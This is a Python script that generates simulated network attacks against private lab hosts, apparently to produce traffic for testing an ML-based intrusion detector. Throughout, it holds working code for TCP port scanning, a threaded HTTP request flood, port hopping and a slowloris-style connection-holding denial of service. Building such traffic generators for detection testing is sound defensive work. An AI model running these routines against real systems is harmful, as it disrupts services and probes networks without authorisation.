#!/usr/bin/env python3
import requests
import time
import random
import argparse
import threading
import socket
import struct

"""
This script simulates different types of attacks that are subtle and don't rely 
on obvious attack signatures but would still be detected by an ML model based on
traffic patterns, port usage, and protocol combinations.

These attacks are designed to:
1. Use legitimate-looking URLs without obvious attack patterns
2. Use unusual but valid port combinations 
3. Generate suspicious traffic patterns (timing, frequency)
4. Create unusual protocol behaviors
"""

# Target hosts in our network
HOSTS = ['10.0.0.1', '10.0.0.2', '10.0.0.3', '10.0.0.4', '10.0.0.5', '10.0.0.6', '10.0.0.7']
HTTP_PORT = 8080

def scan_ports(target_ip, port_range):
    """Perform a port scan on the target IP within the given range"""
    print(f"[*] Starting port scan on {target_ip}, range {port_range[0]}-{port_range[1]}")
    
    open_ports = []
    for port in range(port_range[0], port_range[1] + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            print(f"[+] Port {port} open on {target_ip}")
            open_ports.append(port)
        sock.close()
    
    return open_ports

def perform_http_dos(target_ip, port=HTTP_PORT, duration=10, threads=5):
    """
    Perform an HTTP DoS attack by making many requests in a short time period
    This should trigger rate limiting detection without using attack signatures
    """
    print(f"[*] Starting HTTP request flood on {target_ip}:{port} for {duration} seconds")
    
    stop_event = threading.Event()
    
    def make_requests():
        count = 0
        while not stop_event.is_set():
            try:
                # Use ordinary, non-malicious looking URLs
                urls = [
                    f"http://{target_ip}:{port}/",
                    f"http://{target_ip}:{port}/index.html",
                    f"http://{target_ip}:{port}/about",
                    f"http://{target_ip}:{port}/products?id={random.randint(1, 100)}",
                    f"http://{target_ip}:{port}/search?q=product"
                ]
                url = random.choice(urls)
                
                # Send request
                response = requests.get(url, timeout=0.5)
                count += 1
                
                # Add a very small delay to avoid overwhelming the local system
                time.sleep(0.01)
            except requests.exceptions.RequestException:
                # Ignore connection errors
                pass
        
        print(f"[+] Thread sent {count} requests")
    
    # Start threads
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=make_requests)
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    # Let it run for specified duration
    time.sleep(duration)
    
    # Stop threads
    stop_event.set()
    
    # Wait for threads to finish
    for t in threads_list:
        t.join(timeout=1.0)
    
    print(f"[+] HTTP request flood completed on {target_ip}:{port}")

def perform_port_hopping(target_ips, duration=10):
    """
    Connect to unusual ports across multiple hosts in a pattern
    that resembles port hopping (a technique used to evade firewalls)
    """
    print(f"[*] Starting port hopping pattern across {len(target_ips)} hosts for {duration} seconds")
    
    start_time = time.time()
    
    while time.time() - start_time < duration:
        target_ip = random.choice(target_ips)
        # Use unusual but not standard ports
        unusual_ports = [1025, 2048, 4444, 6667, 8888, 9999, 12345, 15000, 18080, 19999]
        port = random.choice(unusual_ports)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"[+] Connected to unusual port {port} on {target_ip}")
            sock.close()
        except socket.error:
            pass
        
        # Wait a random short amount of time
        time.sleep(random.uniform(0.1, 0.3))
    
    print(f"[+] Port hopping simulation completed")

def send_tcp_to_udp_port(target_ip, port=53, count=10):
    """
    Send TCP packets to a port typically used for UDP
    This creates an unusual protocol-port combination
    """
    print(f"[*] Sending TCP packets to UDP port {port} on {target_ip}")
    
    for _ in range(count):
        try:
            # Create TCP socket instead of expected UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"[+] Connected to UDP port {port} with TCP on {target_ip}")
                sock.send(b"TEST\r\n")
            sock.close()
        except socket.error:
            pass
        
        time.sleep(0.2)
    
    print(f"[+] TCP to UDP port test completed on {target_ip}")

def send_udp_to_tcp_port(target_ip, port=HTTP_PORT, count=10):
    """
    Send UDP packets to a port typically used for TCP
    This creates an unusual protocol-port combination
    """
    print(f"[*] Sending UDP packets to TCP port {port} on {target_ip}")
    
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Send random data
            data = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
            sock.sendto(data, (target_ip, port))
            sock.close()
        except socket.error as e:
            print(f"[!] Error sending UDP packet: {e}")
        
        time.sleep(0.2)
    
    print(f"[+] UDP to TCP port test completed on {target_ip}")

def low_and_slow_attack(target_ip, port=HTTP_PORT, duration=30):
    """
    Perform a low and slow attack that tries to stay under rate limiting
    but still create suspicious patterns over time
    """
    print(f"[*] Starting low and slow attack on {target_ip}:{port} for {duration} seconds")
    
    start_time = time.time()
    established_connections = []
    
    try:
        while time.time() - start_time < duration:
            # Open a new connection but don't close it
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)
                sock.connect((target_ip, port))
                
                # Send partial HTTP request and keep connection open
                sock.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n")
                
                # Keep track of open connection
                established_connections.append(sock)
                print(f"[+] Established connection {len(established_connections)} to {target_ip}:{port}")
                
                # Wait between 3-7 seconds before next connection
                time.sleep(random.uniform(3, 7))
                
                # Occasionally send a small bit of data to keep connection alive
                if len(established_connections) > 0 and random.random() < 0.3:
                    conn_idx = random.randint(0, len(established_connections) - 1)
                    try:
                        established_connections[conn_idx].send(b"\r\n")
                    except socket.error:
                        # Remove dead connection
                        established_connections.pop(conn_idx)
            except socket.error:
                # Ignore connection errors
                pass
    
    finally:
        # Clean up all connections
        for sock in established_connections:
            try:
                sock.close()
            except:
                pass
    
    print(f"[+] Low and slow attack completed on {target_ip}:{port}, peak connections: {len(established_connections)}")

def simulate_structured_attack(target_ips):
    """
    Simulate a structured attack that combines multiple techniques
    This should create a pattern that would be detected by ML but not signature detection
    """
    print(f"[*] Starting structured attack simulation against {len(target_ips)} hosts")
    
    # 1. First perform reconnaissance (port scan) on randomly selected hosts
    recon_targets = random.sample(target_ips, min(3, len(target_ips)))
    for target in recon_targets:
        scan_ports(target, (8000, 8100))
        time.sleep(2)
    
    # 2. Try some protocol-port mismatches on different hosts
    for _ in range(3):
        target = random.choice(target_ips)
        send_udp_to_tcp_port(target)
        time.sleep(1)
    
    # 3. Perform port hopping to look for services
    perform_port_hopping(target_ips, duration=15)
    
    # 4. Target one host with a low and slow attack
    target = random.choice(target_ips)
    low_and_slow_attack(target, duration=20)
    
    # 5. Finally, DoS attack on a different host
    while True:
        final_target = random.choice(target_ips)
        if final_target != target:
            break
    
    perform_http_dos(final_target, duration=15)
    
    print(f"[+] Structured attack simulation completed")

def main():
    parser = argparse.ArgumentParser(description='Simulate subtle network attacks for ML detection')
    parser.add_argument('--scan', action='store_true', help='Perform port scan')
    parser.add_argument('--dos', action='store_true', help='Perform HTTP request flood')
    parser.add_argument('--hopping', action='store_true', help='Perform port hopping')
    parser.add_argument('--tcp-to-udp', action='store_true', help='Send TCP to UDP ports')
    parser.add_argument('--udp-to-tcp', action='store_true', help='Send UDP to TCP ports')
    parser.add_argument('--slow', action='store_true', help='Perform low and slow attack')
    parser.add_argument('--structured', action='store_true', help='Perform structured multi-stage attack')
    parser.add_argument('--all', action='store_true', help='Perform all attack types')
    
    args = parser.parse_args()
    
    # Default to structured attack if no args specified
    if not any(vars(args).values()):
        args.structured = True
    
    if args.scan or args.all:
        target = random.choice(HOSTS)
        scan_ports(target, (8000, 8100))
    
    if args.dos or args.all:
        target = random.choice(HOSTS)
        perform_http_dos(target)
    
    if args.hopping or args.all:
        perform_port_hopping(HOSTS)
    
    if args.tcp_to_udp or args.all:
        target = random.choice(HOSTS)
        send_tcp_to_udp_port(target)
    
    if args.udp_to_tcp or args.all:
        target = random.choice(HOSTS)
        send_udp_to_tcp_port(target)
    
    if args.slow or args.all:
        target = random.choice(HOSTS)
        low_and_slow_attack(target)
    
    if args.structured or args.all:
        simulate_structured_attack(HOSTS)
    
    print("[+] Attack simulation completed")

if __name__ == "__main__":
    main() 